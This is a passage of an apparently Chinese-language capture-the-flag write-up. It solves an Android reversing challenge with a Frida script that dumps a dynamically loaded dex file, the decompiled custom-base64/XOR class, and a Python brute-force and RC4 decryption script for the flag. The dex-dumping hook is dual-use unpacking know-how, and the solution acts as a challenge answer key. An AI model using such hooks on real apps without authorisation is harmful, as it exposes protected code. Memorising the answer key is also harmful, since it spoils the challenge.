class_">FileInputStream</span>.$new(<span class="variable language_">this</span>);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;File opened successfully.&quot;</span>);</span><br><span class="line">                <span class="keyword">var</span> bos = <span class="title class_">ByteArrayOutputStream</span>.$new();</span><br><span class="line">                <span class="keyword">var</span> buffer = <span class="title class_">Java</span>.<span class="title function_">array</span>(<span class="string">&#x27;byte&#x27;</span>, <span class="title class_">Array</span>(<span class="number">1024</span>).<span class="title function_">fill</span>(<span class="number">0</span>));</span><br><span class="line">                <span class="keyword">var</span> bytesRead;</span><br><span class="line">                <span class="keyword">while</span> ((bytesRead = fis.<span class="title function_">read</span>(buffer)) != -<span class="number">1</span>) &#123;</span><br><span class="line">                    bos.<span class="title function_">write</span>(buffer, <span class="number">0</span>, bytesRead);</span><br><span class="line">                &#125;</span><br><span class="line">                fis.<span class="title function_">close</span>();</span><br><span class="line">                <span class="keyword">var</span> byteArray = bos.<span class="title function_">toByteArray</span>();</span><br><span class="line">                <span class="keyword">var</span> resultArray = [];</span><br><span class="line">                <span class="keyword">for</span> (<span class="keyword">var</span> i = <span class="number">0</span>; i &lt; byteArray.<span class="property">length</span>; i++) &#123;</span><br><span class="line">                    resultArray.<span class="title function_">push</span>(byteArray[i] &amp; <span class="number">0xFF</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                bos.<span class="title function_">close</span>();</span><br><span class="line">                <span class="title function_">send</span>(&#123;<span class="attr">type</span>: <span class="string">&quot;dex_content&quot;</span>, <span class="attr">content</span>: resultArray&#125;);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (e) &#123;</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Exception occurred while reading file: &quot;</span> + e);</span><br><span class="line">                <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&quot;Stack trace: &quot;</span> + (e.<span class="property">stack</span> ? e.<span class="property">stack</span> : <span class="string">&quot;No stack trace available&quot;</span>));</span><br><span class="line">                <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">delete</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">this</span>.<span class="title function_">delete</span>();</span><br><span class="line">    &#125;;</span><br><span class="line">&#125;);</span><br><span class="line"><span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>(<span class="params">target_process</span>):</span><br><span class="line">    <span class="comment"># 通过包名启动并附加到应用</span></span><br><span class="line">    device = frida.get_usb_device()</span><br><span class="line">    pid = device.spawn([target_process])</span><br><span class="line">    session = device.attach(pid)</span><br><span class="line"></span><br><span class="line">    script = session.create_script(jscode)</span><br><span class="line">    script.on(<span class="string">&#x27;message&#x27;</span>, on_message)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[*] Attaching from the process.&#x27;</span>)</span><br><span class="line">    script.load()</span><br><span class="line">    <span class="comment"># 继续应用的执行</span></span><br><span class="line">    device.resume(pid)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        sys.stdin.read()</span><br><span class="line">    <span class="keyword">except</span> KeyboardInterrupt:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[*] Detaching from the process.&quot;</span>)</span><br><span class="line">        session.detach()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    process = frida.get_usb_device(-<span class="number">1</span>).enumerate_processes()</span><br><span class="line">    <span class="built_in">print</span>(process)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;Usage: python dump_dex.py &lt;package_name&gt;&quot;</span>)</span><br><span class="line">        sys.exit(<span class="number">1</span>)</span><br><span class="line">    target_process = sys.argv[<span class="number">1</span>]</span><br><span class="line">    main(target_process)</span><br></pre></td></tr></table></figure>
<p>运行后点击图片获得转储出来的dex文件，反编译查看encode方法：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.nobody;</span><br><span class="line"><span class="comment">/* loaded from: E:\CTF\zunjia.dex */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">zundujiadu</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">CUSTOM_ALPHABET</span> <span class="operator">=</span> <span class="string">&quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">int</span>[] DECODE_TABLE = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">128</span>];</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">zundujiadu</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; DECODE_TABLE.length; i++) &#123;</span><br><span class="line">            DECODE_TABLE[i] = -<span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; CUSTOM_ALPHABET.length(); i2++) &#123;</span><br><span class="line">            DECODE_TABLE[CUSTOM_ALPHABET.charAt(i2)] = i2;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">byte</span> b;</span><br><span class="line">        <span class="type">byte</span> b2;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bytes = str.getBytes();</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bytes.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; length; i2++) &#123;</span><br><span class="line">            bytes[i2] = (<span class="type">byte</span>) (bytes[i2] ^ i2);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[((length + <span class="number">2</span>) / <span class="number">3</span>) * <span class="number">4</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i3 &lt; length) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i3 + <span class="number">1</span>;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> bytes[i3];</span><br><span class="line">            <span class="keyword">if</span> (i5 &lt; length) &#123;</span><br><span class="line">                i = i5 + <span class="number">1</span>;</span><br><span class="line">                b = bytes[i5];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = i5;</span><br><span class="line">                b = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; length) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                b2 = bytes[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b2 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> ((b3 &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((b &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span>) | (b2 &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> i4 + <span class="number">1</span>;</span><br><span class="line">            bArr[i4] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> i7 + <span class="number">1</span>;</span><br><span class="line">            bArr[i7] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i9</span> <span class="operator">=</span> i8 + <span class="number">1</span>;</span><br><span class="line">            bArr[i8] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            i4 = i9 + <span class="number">1</span>;</span><br><span class="line">            bArr[i9] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt(i6 &amp; <span class="number">63</span>);</span><br><span class="line">            i3 = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(bArr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">encode</span><span class="params">(<span class="type">byte</span>[] bArr)</span> &#123;</span><br><span class="line">        <span class="type">int</span> i;</span><br><span class="line">        <span class="type">byte</span> b;</span><br><span class="line">        <span class="type">byte</span> b2;</span><br><span class="line">        <span class="keyword">if</span> (bArr == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> bArr.length;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>; i2 &lt; length; i2++) &#123;</span><br><span class="line">            bArr[i2] = (<span class="type">byte</span>) (bArr[i2] ^ i2);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">byte</span>[] bArr2 = <span class="keyword">new</span> <span class="title class_">byte</span>[((length + <span class="number">2</span>) / <span class="number">3</span>) * <span class="number">4</span>];</span><br><span class="line">        <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">while</span> (i3 &lt; length) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> i3 + <span class="number">1</span>;</span><br><span class="line">            <span class="type">byte</span> <span class="variable">b3</span> <span class="operator">=</span> bArr[i3];</span><br><span class="line">            <span class="keyword">if</span> (i5 &lt; length) &#123;</span><br><span class="line">                i = i5 + <span class="number">1</span>;</span><br><span class="line">                b = bArr[i5];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                i = i5;</span><br><span class="line">                b = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; length) &#123;</span><br><span class="line">                i++;</span><br><span class="line">                b2 = bArr[i];</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                b2 = <span class="number">0</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> ((b3 &amp; <span class="number">255</span>) &lt;&lt; <span class="number">16</span>) | ((b &amp; <span class="number">255</span>) &lt;&lt; <span class="number">8</span>) | (b2 &amp; <span class="number">255</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> i4 + <span class="number">1</span>;</span><br><span class="line">            bArr2[i4] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">18</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> i7 + <span class="number">1</span>;</span><br><span class="line">            bArr2[i7] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">12</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            <span class="type">int</span> <span class="variable">i9</span> <span class="operator">=</span> i8 + <span class="number">1</span>;</span><br><span class="line">            bArr2[i8] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt((i6 &gt;&gt; <span class="number">6</span>) &amp; <span class="number">63</span>);</span><br><span class="line">            i4 = i9 + <span class="number">1</span>;</span><br><span class="line">            bArr2[i9] = (<span class="type">byte</span>) CUSTOM_ALPHABET.charAt(i6 &amp; <span class="number">63</span>);</span><br><span class="line">            i3 = i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(bArr2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">decode</span><span class="params">(String str)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (str == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="type">String</span> <span class="variable">replace</span> <span class="operator">=</span> str.replace(<span class="string">&quot;=&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">        <span class="type">int</span> <span class="variable">length</span> <span class="operator">=</span> replace.length();</span><br><span class="line">        <span class="keyword">if</span> (length % <span class="number">4</span> == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> (length * <span class="number">3</span>) / <span class="number">4</span>;</span><br><span class="line">            <span class="type">byte</span>[] bArr = <span class="keyword">new</span> <span class="title class_">byte</span>[i];</span><br><span class="line">            <span class="type">int</span> <span class="variable">i2</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="type">int</span> <span class="variable">i3</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">            <span class="keyword">while</span> (i2 &lt; length) &#123;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i4</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i5</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">                <span class="keyword">while</span> (i4 &lt; <span class="number">4</span>) &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">i6</span> <span class="operator">=</span> i2 + <span class="number">1</span>;</span><br><span class="line">                    <span class="type">char</span> <span class="variable">charAt</span> <span class="operator">=</span> replace.charAt(i2);</span><br><span class="line">                    <span class="keyword">if</span> (charAt &lt; <span class="number">0</span> || charAt &gt;= DECODE_TABLE.length || DECODE_TABLE[charAt] == -<span class="number">1</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;输入的 Base64 字符串包含非法字符: &quot;</span> + charAt);</span><br><span class="line">                    &#125;</span><br><span class="line">                    i5 |= DECODE_TABLE[charAt] &lt;&lt; ((<span class="number">3</span> - i4) * <span class="number">6</span>);</span><br><span class="line">                    i4++;</span><br><span class="line">                    i2 = i6;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">int</span> <span class="variable">i7</span> <span class="operator">=</span> i3 + <span class="number">1</span>;</span><br><span class="line">                bArr[i3] = (<span class="type">byte</span>) ((i5 &gt;&gt; <span class="number">16</span>) &amp; <span class="number">255</span>);</span><br><span class="line">                <span class="keyword">if</span> (i7 &lt; i) &#123;</span><br><span class="line">                    bArr[i7] = (<span class="type">byte</span>) ((i5 &gt;&gt; <span class="number">8</span>) &amp; <span class="number">255</span>);</span><br><span class="line">                    i7++;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (i7 &lt; i) &#123;</span><br><span class="line">                    i3 = i7 + <span class="number">1</span>;</span><br><span class="line">                    bArr[i7] = (<span class="type">byte</span>) (i5 &amp; <span class="number">255</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    i3 = i7;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i8</span> <span class="operator">=</span> <span class="number">0</span>; i8 &lt; i3; i8++) &#123;</span><br><span class="line"></span><br><span class="line">                bArr[i8] = (<span class="type">byte</span>) (bArr[i8] ^ i8);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> <span class="title class_">String</span>(bArr, <span class="number">0</span>, i3);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;输入的 Base64 字符串长度不是 4 的倍数&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>找到了这个自定义base64表：<font color=red><strong>3GHIJKLMNOPQRSTUb&#x3D;cdefghijklmnopWXYZ&#x2F;12+406789VaqrstuvwxyzABCDEF5</strong></font>，同时还发现了一个简单异或加密，测试发现是把生成的base64字符串带入和上文所给的密文进行RC4解密，构造python脚本实现相同效果，并爆破枚举0.o与o.0构成的字符串：</p>
<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> itertools</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Zundujiadu</span>:</span><br><span class="line">    CUSTOM_ALPHABET = <span class="string">&quot;3GHIJKLMNOPQRSTUb=cdefghijklmnopWXYZ/12+406789VaqrstuvwxyzABCDEF5&quot;</span></span><br><span class="line">    STANDARD_ALPHABET = <span class="string">&#x27;ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/&#x27;</span></span><br><span class="line">    DECODE_TABLE = &#123;char: index <span class="keyword">for</span> index, char <span class="keyword">in</span> <span class="built_in">enumerate</span>(CUSTOM_ALPHABET)&#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">encode</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(data, <span class="built_in">str</span>):</span><br><span class="line">            data = data.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">        xor_data = <span class="built_in">bytes</span>([byte ^ i <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(data)])</span><br><span class="line">        encoded = <span class="variable language_">self</span>.base64_encode(xor_data)</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.CUSTOM_ALPHABET[<span class="variable language_">self</span>.STANDARD_ALPHABET.index(c)] <span class="keyword">for</span> c <span class="keyword">in</span> encoded), xor_data</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">self, data</span>):</span><br><span class="line">        translated = <span class="string">&#x27;&#x27;</span>.join(<span class="variable language_">self</span>.STANDARD_ALPHABET[<span class="variable language_">self</span>.DECODE_TABLE[char]]</span><br><span class="line">                             <span class="keyword">for</span> char <span class="keyword">in</span> data <span class="keyword">if</span> char <span class="keyword">in</span> <span class="variable language_">self</span>.DECODE_TABLE)</span><br><span class="line">        decoded = <span class="variable language_">self</span>.base64_decode(translated)</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">bytes</span>([byte ^ i <span class="keyword">for</span> i, byte <span class="keyword">in</span> <span class="built_in">enumerate</span>(decoded)]).decode(<span class="string">&#x27;utf-8&#x27;</span>, errors=<span class="string">&#x27;replace&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64_encode</span>(<span class="params">data</span>):</span><br><span class="line">        missing_padding = <span class="built_in">len</span>(data) % <span class="number">3</span></span><br><span class="line">        <span class="keyword">if</span> missing_padding:</span><br><span class="line">            data += <span class="string">b&#x27;=&#x27;</span> * (<span class="number">3</span> - missing_padding)</span><br><span class="line">        <span class="keyword">return</span> base64.b64encode(data).decode(<span class="string">&#x27;utf-8&#x27;</span>).rstrip(<span class="string">&#x27;=&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">    @staticmethod</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">base64_decode</span>(<span class="params">data</span>):</span><br><span class="line">        data = data + <span class="string">&#x27;=&#x27;</span> * (-<span class="built_in">len</span>(data) % <span class="number">4</span>)</span><br><span class="line">        <span class="keyword">return</span> base64.b64decode(data)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rc4_encrypt</span>(<span class="params">key, plaintext</span>):</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">ksa</span>(<span class="params">key</span>):</span><br><span class="line">        s_box = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + s_box[i] + <span class="built_in">ord</span>(key[i % <span class="built_in">len</span>(key)])) % <span class="number">256</span></span><br><span class="line">            s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">        <span class="keyword">return</span> s_box</span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">prga</span>(<span class="params">s_box, length</span>):</span><br><span class="line">        i = <span class="number">0</span></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        keystream = []</span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length):</span><br><span class="line">            i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">            j = (j + s_box[i]) % <span class="number">256</span></span><br><span class="line">            s_box[i], s_box[j] = s_box[j], s_box[i]</span><br><span class="line">            k = s_box[(s_box[i] + s_box[j]) % <span class="number">256</span>]</span><br><span class="line">            keystream.append(k)</span><br><span class="line">        <span class="keyword">return</span> keystream</span><br><span class="line"></span><br><span class="line">    s_box = ksa(key)</span><br><span class="line">    keystream = prga(s_box, <span class="built_in">len</span>(plaintext))</span><br><span class="line">    ciphertext = <span class="built_in">bytearray</span>([p ^ k <span class="keyword">for</span> p, k <span class="keyword">in</span> <span class="built_in">zip</span>(plaintext, keystream)])</span><br><span class="line">    hex_array = <span class="string">&#x27;, &#x27;</span>.join(<span class="string">f&#x27;0x<span class="subst">&#123;byte:02X&#125;</span>&#x27;</span> <span class="keyword">for</span> byte <span class="keyword">in</span> ciphertext)</span><br><span class="line">    <span class="keyword">return</span> hex_array, ciphertext</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    codec = Zundujiadu()</span><br><span class="line">    encflag = <span class="string">b&quot;\x7a\xc7\xc7\x94\x51\x82\xf5\x99\x0c\x30\xc8\xcd\x97\xfe\x3d\xd2\xae\x0e\xba\x83\x59\x87\xbb\xc6\x35\xe1\x8c\x59\xef\xad\xfa\x94\x74\xd3\x42\x27\x98\x77\x54\x3b\x46\x5e\x95&quot;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;E:/CTF/output.txt&quot;</span>, <span class="string">&quot;w&quot;</span>) <span class="keyword">as</span> file:</span><br><span class="line">        <span class="keyword">for</span> pattern <span class="keyword">in</span> itertools.product((<span class="string">&#x27;0.o&#x27;</span>, <span 